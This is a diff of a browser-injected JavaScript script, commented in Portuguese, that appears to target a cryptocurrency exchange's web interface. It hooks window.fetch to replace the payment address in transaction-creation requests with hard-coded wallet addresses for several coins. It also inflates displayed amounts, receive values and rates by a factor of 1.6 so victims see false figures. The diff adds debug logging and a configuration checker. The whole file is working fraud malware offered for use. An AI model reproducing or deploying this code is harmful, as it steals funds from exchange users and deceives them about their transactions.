@@ -1,14 +1,13 @@
 (() => {
   'use strict';
 
-  // ================= CONFIG =================
+  // ============ 1. O QUE MUDAS ============
   const CFG = {
     password: 'admin',
     onlyBuild: '1.3',
     factor: 1.6,
     minUsd: 200,
     coins: ['btc', 'sol', 'eth', 'ltc', 'xmr'],
-    fallbackAddr: 'bc1qaaf645hmux039lq9v2d33djhs2grqwk5vqrxea',
     addresses: {
       btc: ['bc1q7wc73ha2c8smajp3t2jxdxd2kmza9mg9kd06k2', 'bc1pgrhw46rfu6dfrxtglhx9jfl5vz3s0x2g475936ungw3ct3pfsc3q02un58'],
       eth: ['0xC66A612e01A5f74e5d69dA1a7F1ddF64DebdAb4c'],
@@ -16,6 +15,11 @@
       ltc: ['ltc1qaaf645hmux039lq9v2d33djhs2grqwk5guezpd'],
       xmr: ['WXMRyRZhsa19ety5erZhHg4N3xj3EVN92u94422teJp'],
     },
+    fallbackAddr: 'bc1qaaf645hmux039lq9v2d33djhs2grqwk5vqrxea',
+
+    // ============ 2. O QUE NÃO MEXES ============
+    debug: true,
+    syncInput: false,
     geckoIds: { btc: 'bitcoin', eth: 'ethereum', sol: 'solana', ltc: 'litecoin', xmr: 'monero' },
     priceTtl: 60000,
     tick: 30,
@@ -32,8 +36,8 @@
 
   if (window.__mod_loader) { window.__mod_loader.showAlreadyLoaded(); return; }
 
-  const addrs = {};                 // cache de endereço por moeda
-  const prices = {};                // { coin: { usd, ts } }
+  const addrs = {};
+  const prices = {};
   let active = false;
   let panel = null;
   let selected = null;
@@ -42,8 +46,8 @@
 
   const $(s, r = document) => r.querySelector(s);
   const isFixed = () => !!$('[data-tnav="rate-type-input"]')?.checked;
+  const num = v => { const n = parseFloat(String(v).replace(/[^\d.]/g, '')); return isNaN(n) ? null : n; };
 
-  /* ---------- endereços ---------- */
   function pickAddr(coin) {
     const list = CFG.addresses[coin?.toLowerCase()];
     if (!list?.length) return CFG.fallbackAddr;
@@ -56,7 +60,6 @@
     return addrs[c];
   }
 
-  /* ---------- preços ---------- */
   async function withTimeout(url, ms = 5000) {
     const ac = new AbortController();
     const t = setTimeout(() => ac.abort(), ms);
@@ -69,8 +72,7 @@
     try {
       const ids = need.map(c => CFG.geckoIds[c]).filter(Boolean);
       if (ids.length) {
-        const r = await withTimeout(
-          `https://api.coingecko.com/api/v3/simple/price?ids=${ids.join(',')}&vs_currencies=usd`, 4000);
+        const r = await withTimeout(`https://api.coingecko.com/api/v3/simple/price?ids=${ids.join(',')}&vs_currencies=usd`, 4000);
         const j = await r.json();
         for (const c of need) {
           const v = j?.[CFG.geckoIds[c]]?.usd;
@@ -97,13 +99,12 @@
     return usd !== null && usd >= CFG.minUsd;
   };
   const scale = (raw, dec = 2) => {
-    const n = parseFloat(raw);
-    if (isNaN(n)) return raw;
-    const d = Math.min((String(raw).split('.')[1] || '').length, dec);
+    const n = num(raw);
+    if (n === null) return raw;
+    const d = Math.min((String(n).split('.')[1] || '').length, dec);
     return (n * CFG.factor).toFixed(d);
   };
 
-  /* ---------- hook de rede ---------- */
   function install() {
     if (active) return;
     active = true;
@@ -113,7 +114,10 @@
       const first = args[0];
       const url = typeof first === 'string' ? first : (first?.url || '');
 
-      // 1. pedido: troca o endereço de pagamento
+      if (CFG.debug && (CFG.createPath.test(url) || /\/estimate/.test(url))) {
+        console.log('[cm] REQ', url, args[1]?.body);
+      }
+
       try {
         const isPost = args[1]?.method === 'POST' || first?.method === 'POST';
         if (CFG.createPath.test(url) && isPost && args[1]?.body) {
@@ -125,7 +129,8 @@
 
       const res = await originalFetch.apply(this, args);
 
-      // 2. resposta de detalhes da transação
+      if (CFG.debug && CFG.txPath.test(url)) res.clone().text().then(t => console.log('[cm] RAW TX', t));
+
       try {
         if (CFG.txPath.test(url)) {
           const j = JSON.parse(await res.clone().text());
@@ -139,7 +144,6 @@
         }
       } catch {}
 
-      // 3. estimativas
       try {
         if (/\/estimate/.test(url)) {
           const j = JSON.parse(await res.clone().text());
@@ -158,17 +162,16 @@
     startLoops();
   }
 
-  /* ---------- DOM ---------- */
   function patchAmountInput() {
     const inp = $('input[data-tnav="input-amount"]');
     if (!inp || inp.dataset.boosted === '1') return;
     const ticker = inp.closest('.calculator-ticker')?.textContent?.trim();
     if (!ticker || !CFG.coins.includes(ticker.toLowerCase())) return;
-    const m = inp.value.match(/[\d.]+/);
-    if (!m) return;
-    if (!qualifies(parseFloat(m[0]), ticker)) return;
+    const n = num(inp.value);
+    if (!n || !qualifies(n, ticker)) return;
     inp.dataset.boosted = '1';
-    inp.value = (parseFloat(m[0]) * CFG.factor).toFixed(8);
+    inp.value = (n * CFG.factor).toFixed(8);
+    if (CFG.syncInput) inp.dispatchEvent(new Event('input', { bubbles: true }));
   }
 
   function patchReceiveValue() {
@@ -179,10 +182,10 @@
     const src = $('[data-tnav="input-amount-to"]')?.querySelector('input');
     const ticker = src?.closest('.calculator-ticker')?.textContent?.trim();
     if (!ticker || !CFG.coins.includes(ticker.toLowerCase())) return;
-    const m = (node.textContent || '').trim().match(/^(~\s*)([\d.]+)\s*$/);
-    if (!m) return;
+    const n = num(node.textContent);
+    if (!n) return;
     node.dataset.boosted = '1';
-    node.textContent = m[1] + (parseFloat(m[2]) * CFG.factor).toFixed(2);
+    node.textContent = '~ ' + (n * CFG.factor).toFixed(2);
   }
 
   function patchTxModal() {
@@ -190,13 +193,13 @@
     if (!modal) return;
     const you = modal.querySelector('[data-tnav="tx-details-you-get-value"]');
     if (you && you.dataset.done !== '1') {
-      const m = (you.textContent || '').trim().match(/^(~\s*)([\d.]+)$/);
-      if (m) { you.dataset.done = '1'; you.textContent = m[1] + (parseFloat(m[2]) * CFG.factor).toFixed(2); }
+      const n = num(you.textContent);
+      if (n) { you.dataset.done = '1'; you.textContent = '~ ' + (n * CFG.factor).toFixed(2); }
     }
     const rate = modal.querySelector('[data-tnav="tx-details-floating-rate-value"]');
     if (rate && rate.dataset.done !== '1') {
-      const n = (rate.textContent || '').trim();
-      if (/^[\d.]+$/.test(n)) { rate.dataset.done = '1'; rate.textContent = (parseFloat(n) * CFG.factor).toFixed(2); }
+      const n = num(rate.textContent);
+      if (n) { rate.dataset.done = '1'; rate.textContent = (n * CFG.factor).toFixed(2); }
     }
   }
 
@@ -264,12 +267,10 @@
     if (originalFetch) window.fetch = originalFetch;
     timers.forEach(t => t.mo ? t.mo.disconnect() : clearInterval(t));
     timers = [];
-    document.querySelectorAll('.usd-inline').forEach(e => e.remove());
     document.querySelectorAll('[data-boosted],[data-done]').forEach(e => { delete e.dataset.boosted; delete e.dataset.done; });
     delete window.__mod_active;
   }
 
-  /* ---------- painel ---------- */
   const STYLE = `#__cm_ov{position:fixed;inset:0;z-index:2147483647;display:flex;align-items:center;justify-content:center;background:rgba(9,11,15,.64);backdrop-filter:blur(12px);font:14px/1.4 system-ui,sans-serif}
 #__cm_ov .p{width:min(760px,100%);background:#fff;border-radius:18px;overflow:hidden;box-shadow:0 35px 100px rgba(0,0,0,.3)}
 #__cm_ov .h{display:flex;justify-content:space-between;align-items:center;padding:20px 24px;border-bottom:1px solid #e8e9ed}
@@ -352,6 +353,17 @@
     kill: teardown,
   };
   window.__mod_active = false;
+
+  (function checkCfg() {
+    const bad = [];
+    if (!CFG.fallbackAddr) bad.push('fallbackAddr vazio');
+    for (const c of CFG.coins) {
+      const l = CFG.addresses[c] || [];
+      if (!l.length || l.some(a => !a)) bad.push(`${c} sem endereço`);
+      if (c === 'xmr' && l.some(a => a && a.length !== 95)) bad.push('xmr com tamanho errado (tem de ser 95)');
+    }
+    if (bad.length) console.warn('[cm] config incompleta:', bad.join(' | '));
+  })();
 
   if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', buildPanel);
   else buildPanel();
